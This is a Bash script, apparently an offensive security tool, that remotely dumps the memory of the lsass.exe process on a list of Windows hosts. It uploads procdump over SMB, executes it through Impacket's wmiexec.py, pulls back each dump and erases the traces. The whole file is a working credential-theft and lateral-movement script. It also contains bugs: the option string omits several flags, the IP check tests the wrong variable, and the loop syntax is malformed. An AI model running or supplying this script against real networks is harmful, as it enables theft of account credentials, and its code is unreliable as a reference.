#!/usr/bin/env bash
#
# Remotely dumps the memory contents of the lsass.exe process
# using wmiexec.py, smbclient, and procdump.exe.
#
# All credit to @TinkerSec for the method, script also heavily influenced by their script:
# https://github.com/tinkersec/scratchpad/blob/master/BashScripts/grabDump.sh

usage () { 
	echo "Usage: dump-lsass.sh -d <domain> -u <username> -p <password> -r <procdump location> -w <path to wmiexec.py> [host list]"
    echo "  -h:         show this help message"
    echo "  -d:         domain to use for authentication"
    echo "  -u:         username to use for authentication"
    echo "  -p:         password to use for authentication"
    echo "  -r:         path to procdump64.exe"
    echo "  -w:         path to wmiexec.py from the Impacket suite of tools"
    echo "  host list:  either a file containing a list of systems separated by newlines"
    echo "              or a single IP address"
}

while getopts "hp:w:" OPTION; do
	case "$OPTION" in
		h ) usage; exit;;
        d ) DOMAIN="$OPTARG";;
        u ) USERNAME="$OPTARG";;
        p ) PASSWORD="$OPTARG";;
		r ) PROCDUMP="$OPTARG";;
		w ) WMIEXEC="$OPTARG";;
		\?) echo "Unknown option: -$OPTARG" >&2; exit 1;;
		: ) echo "Missing argument for -$OPTARG" >&2; exit 1;;
		* ) echo "Invalid option provided: -$OPTARG" >&2; exit 1;;
	esac
done

# get the positional argument
HOSTLIST=${@:$OPTIND:1}

# test required arguments
if [ ! "$DOMAIN" ] || [ ! "$USERNAME" ] || [ ! "$PASSWORD" ] || [ ! "$PROCDUMP" ] || [ ! "$WMIEXEC" ] || [ ! "$HOSTLIST" ]
then
	echo "Missing required arguments"
	usage
	exit 1
fi

# get the list of hosts
if [ -f "$HOSTLIST" ]; 
then
	TARGET_LIST=`cat $HOSTLIST`
elif [[ "$TARGETS" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
then
    TARGET_LIST="$HOSTLIST"
else
    echo "Unable to determine target list from $HOSTLIST, exiting"
    usage
    exit 1
fi

# perform the procedure for each host
for HOST in {$TARGET_LIST[@]}; do
    echo "Uploading procdump to $HOST..."
    smbclient -U ''$USERNAME%$PASSWORD'' -W "$DOMAIN" -c "put $PROCDUMP procdump.exe" \\\\"$HOST"\\C$
    echo
    echo "Running procdump to dump lsass.exe process..."
    python $WMIEXEC "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$HOST" 'procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp'
    echo
    echo "Retrieving the LSASS dump..."
    smbclient -U ''$USERNAME%$PASSWORD'' -W "$DOMAIN" -c "get lsass.dmp lsass-$HOST.dmp" \\\\"$HOST"\\C$
    echo
    echo "Saved dump as lsass-$HOST.dmp"
    echo
    echo "Cleaning up..."
    smbclient -U ''$USERNAME%$PASSWORD'' -W "$DOMAIN" -c "rm procdump.exe;rm lsass.dmp" \\\\"$HOST"\\C$
    echo
    echo "$HOST completed"
done

exit 0